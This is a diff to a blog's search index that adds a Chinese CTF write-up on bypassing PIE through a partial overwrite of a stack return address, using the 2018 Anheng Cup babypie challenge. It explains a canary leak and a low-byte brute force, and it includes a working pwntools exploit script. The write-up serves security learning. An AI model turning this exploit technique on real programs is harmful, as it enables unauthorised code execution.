@@ -4,6 +4,31 @@
   
     
     <entry>
+      <title>栈上的partial overwrite（绕过pie）</title>
+      <link href="/2024/08/05/%E6%A0%88%E4%B8%8A%E7%9A%84partial%20overwrite%EF%BC%88%E7%BB%95%E8%BF%87pie%EF%BC%89/"/>
+      <url>/2024/08/05/%E6%A0%88%E4%B8%8A%E7%9A%84partial%20overwrite%EF%BC%88%E7%BB%95%E8%BF%87pie%EF%BC%89/</url>
+      
+        <content type="html"><![CDATA[<p><em>仅供个人学习参考</em>  </p><span id="more"></span><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>我们知道, 在开启了随机化（ASLR，PIE）后, 无论高位的地址如何变化，低 12 位的页内偏移始终是固定的, 也就是说如果我们能更改低位的偏移, 就可以在一定程度上控制程序的执行流, 绕过 PIE 保护</p><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p>2018 - 安恒杯 - babypie <a href="https://raw.githubusercontent.com/GNchen1/Pages/main/Img/babypie">https://raw.githubusercontent.com/GNchen1/Pages/main/Img/babypie</a></p><p>可以看到保护全开（除了relro半开）<br><img src="https://raw.githubusercontent.com/GNchen1/Pages/main/Img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-08-05%20184649.png" alt="1"><br>ida查看，发现有两次栈溢出，且有后门函数<br><img src="https://raw.githubusercontent.com/GNchen1/Pages/main/Img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-08-05%20184829.png" alt="1"><br>在第一次 read 之后紧接着就有一个输出, 而 read 并不会给输入的末尾加上 \0, 这就给了我们 leak 栈上内容的机会。我们利用第一次read泄露canary<br>而返回地址与 get shell 函数的地址只有低位的 16 bit 不同,而返回地址低两位字节中只有4 bit是无法控制的，如果覆写低 16 bit 为 0x?A3F, 就有一定的几率 get shell<br>所以考虑低位爆破后门函数的地址</p><p><em>canary为了防止被泄露，最低字节固定为\x00，所以我们可以覆盖这个字节来达到泄露的目的</em></p><p>exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#  context.log_level = &quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        io = process(<span class="string">&quot;./babypie&quot;</span>, timeout = <span class="number">1</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment">#  泄露canary</span></span><br><span class="line">        io.sendafter(<span class="string">&quot;:\n&quot;</span>, <span class="string">&#x27;a&#x27;</span> * (<span class="number">0x30</span> - <span class="number">0x8</span> + <span class="number">1</span>))</span><br><span class="line">        io.recvuntil(<span class="string">&#x27;a&#x27;</span> * (<span class="number">0x30</span> - <span class="number">0x8</span> + <span class="number">1</span>))</span><br><span class="line">        canary = <span class="string">&#x27;\0&#x27;</span> + io.recvn(<span class="number">7</span>)</span><br><span class="line">        success(canary.encode(<span class="string">&#x27;hex&#x27;</span>))</span><br><span class="line">        </span><br><span class="line">        <span class="comment">#  gdb.attach(io)</span></span><br><span class="line">        io.sendafter(<span class="string">&quot;:\n&quot;</span>, <span class="string">&#x27;a&#x27;</span> * (<span class="number">0x30</span> - <span class="number">0x8</span>) + canary + <span class="string">&#x27;bbbbbbbb&#x27;</span> + <span class="string">&#x27;\x3f\x0A&#x27;</span>) <span class="comment">#考虑栈对齐</span></span><br><span class="line">        </span><br><span class="line">        io.interactive()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        io.close()</span><br><span class="line">        <span class="built_in">print</span> e</span><br></pre></td></tr></table></figure><p><em>这种技巧不止在栈上有效, 在堆上也是一种有效的绕过地址随机化的手段</em></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> Stack </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> partial overwrite </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>Stack pivoting(栈翻转)</title>
       <link href="/2024/08/05/Stack%20pivoting(%E6%A0%88%E7%BF%BB%E8%BD%AC)/"/>
       <url>/2024/08/05/Stack%20pivoting(%E6%A0%88%E7%BF%BB%E8%BD%AC)/</url>
